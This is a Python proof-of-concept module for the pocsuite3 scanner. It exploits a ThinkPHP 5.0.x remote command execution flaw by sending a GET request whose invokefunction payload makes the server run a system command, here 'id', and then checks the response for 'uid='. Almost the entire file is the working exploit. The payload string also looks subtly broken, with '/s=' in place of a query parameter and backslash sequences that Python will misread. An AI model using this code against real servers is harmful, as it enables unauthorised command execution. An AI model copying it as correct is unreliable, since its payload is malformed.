from pocsuite3.api import Output, POCBase, register_poc, requests, logger

class ThinkPHP_RCE_POC(POCBase):
    vulID = 'SSVID-99617'
    version = '1.0'
    author = 'Security Researcher'
    vulDate = '2023-10-27'
    createDate = '2023-10-27'
    updateDate = '2023-10-27'
    references = ['https://www.thinkphp.cn/', 'https://nvd.nist.gov/']
    name = 'ThinkPHP Command Execution Vulnerability'
    appPowerLink = 'https://www.thinkphp.cn/'
    appName = 'ThinkPHP'
    appVersion = '5.0.0 - 5.0.23'
    vulType = 'Command Execution'
    desc = 'ThinkPHP is a free and fast MVC PHP framework, from which you can quickly develop Web applications. The vulnerability exists in the invokefunction method, allowing remote attackers to execute arbitrary system commands via the "s" parameter.'
    samples = []
    install_requires = ['requests']

    def _verify(self):
        result = {}
        url = self.target.rstrip('/')
        
        # Common ThinkPHP entry paths
        paths = ['/index.php', '/public/index.php']
        
        for path in paths:
            try:
                # Standard payload for ThinkPHP 5.x RCE (invokefunction)
                # This exploits the call_user_func_array vulnerability via the 's' parameter
                payload = f"{path}/s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id"
                
                verify_url = url + payload
                
                # Send request with timeout and SSL verification disabled for PoC
                resp = requests.get(verify_url, timeout=10, verify=False)
                
                # Check for common indicators of command execution output (uid= or gid=)
                if "uid=" in resp.text.lower() or "gid=" in resp.text.lower():
                    result['VerifyInfo'] = {
                        'URL': verify_url,
                        'Payload': payload,
                        'Exploit': True
                    }
                    logger.success(f"Target {verify_url} is vulnerable to ThinkPHP RCE.")
                    return self.output.parse(result)
                    
            except requests.exceptions.RequestException as e:
                logger.error(f"Request failed for {verify_url}: {e}")
                continue
            except Exception as e:
                logger.error(f"Error verifying target: {e}")
                continue
                
        return self.output.parse(result)

    def _attack(self):
        # The attack phase usually performs the same verification or a more destructive action.
        # Here we call _verify as the exploit payload is the same verification payload.
        self._verify()

    def parse_output(self, result):
        if result:
            return self.output.success(result)
        else:
            return self.output.fail()